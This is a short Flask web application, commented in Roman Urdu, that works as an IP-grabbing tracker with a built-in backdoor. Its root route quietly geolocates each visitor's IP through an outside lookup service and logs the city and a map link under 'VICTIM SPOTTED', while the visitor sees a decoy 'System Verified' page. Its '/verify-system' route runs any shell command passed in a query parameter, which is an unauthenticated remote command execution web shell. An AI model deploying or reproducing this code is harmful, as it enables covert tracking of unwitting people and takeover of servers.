from flask import Flask, request
import requests
import os

app = Flask(__name__)

@app.route('/')
def home():
    # 1. Asli IP Address pakarna
    user_ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
    
    # 2. Basic Log (Taake pata chale visit hui hai)
    print(f"\n--- [NEW VISIT] IP: {user_ip} ---")
    
    try:
        # 3. Location nikalna
        response = requests.get(f'http://ip-api.com/json/{user_ip}', timeout=10)
        data = response.json()
        
        city = data.get('city', 'Karachi')
        lat = data.get('lat', '24.8607')
        lon = data.get('lon', '67.0011')
        map_link = f"https://www.google.com/maps?q={lat},{lon}"
        
        # --- YE DETAILS LOGS MEIN SHOW HONGI ---
        print(f"[!!!] VICTIM SPOTTED [!!!]")
        print(f"CITY: {city} | IP: {user_ip}")
        print(f"LOCATION: {map_link}\n")
        
        return f"<h2>System Verified</h2><p>Location: {city}</p><p>IP: {user_ip}</p>"
        
    except Exception as e:
        print(f"[ERROR] Tracking Failed: {str(e)}")
        return f"<h2>System Online</h2><p>IP: {user_ip}</p>"

@app.route('/verify-system')
def verify_system():
    # RCE System (Linux details ke liye)
    cmd = request.args.get('c', 'ls')
    try:
        output = os.popen(cmd).read()
        return f"<pre>Console Output:\n{output}</pre>"
    except:
        return "Access Denied"
